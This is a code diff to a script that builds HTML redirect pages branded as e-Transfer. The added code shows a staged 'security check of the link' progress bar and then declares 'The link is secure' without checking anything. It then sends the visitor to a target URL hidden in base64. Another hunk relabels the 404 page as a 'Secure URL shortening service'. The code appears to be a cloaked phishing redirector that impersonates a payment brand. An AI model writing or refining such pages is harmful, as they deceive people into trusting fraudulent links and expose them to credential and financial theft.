@@ -149,29 +149,36 @@ function createRedirectPage(targetURL) {
         </div>
         <div class="percentage" id="percentage">0%</div>
           <p>&copy; e-Transfer 2000-2025. All rights reserved.</p>
-          <p>This is a secure transaction. 🔒</p>
+          <p>Security check of the link. 🔒</p>
           
           <script nonce="unique123" type="text/javascript">
-            const progressBar = document.getElementById('progress-bar');
-            const percentage = document.getElementById('percentage');
-            let progress = 0;
-  
-            const interval = setInterval(() => {
-              progress += 10;
-              progressBar.style.width = progress + '%';
-              percentage.textContent = progress + '%';
-  
-              if (progress >= 100) {
-                clearInterval(interval);
-  
-                
+    const progressBar = document.getElementById('progress-bar');
+    const percentage = document.getElementById('percentage');
+    const progressContainer = document.querySelector('.progress');
+    let progress = 0;
+
+    const interval = setInterval(() => {
+        progress += 10;
+        progressBar.style.width = progress + '%';
+        percentage.textContent = progress + '%';
+
+        if (progress >= 100) {
+            clearInterval(interval);
+
+            
+            setTimeout(() => {
+                progressContainer.style.display = 'none';
+                percentage.innerHTML = '<b>The link is secure</b>';
+
+               
                 setTimeout(() => {
-                  const url = atob('${encodedURL}'); 
-                  window.location.href = url; 
-                }, 500);  
-              }
-            }, 600); 
-          </script>
+                    const url = atob('${encodedURL}'); 
+                    window.location.href = url; 
+                }, 1000);
+            }, 500);
+        }
+    }, 600);
+</script>
       </body>
       </html>
     `;
@@ -200,7 +207,7 @@ function create404Page() {
       <head>
           <meta charset="UTF-8">
           <meta name="viewport" content="width=device-width, initial-scale=1.0">
-          <title>404 Not Found</title>
+          <title>Secure URL shortening service</title>
           <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:;">
           <meta name="referrer" content="no-referrer">
           <meta name="permissions-policy" content="fullscreen=(), geolocation=()">
@@ -223,7 +230,7 @@ function create404Page() {
           </style>
       </head>
       <body>
-          <h1>404 - Page Not Found</h1>
+          <h1>Secure URL shortening service</h1>
           <p>The page you are looking for does not exist.</p>
           <footer>
               <p>&copy; e-Transfer 2000-2025. All rights reserved.</p>
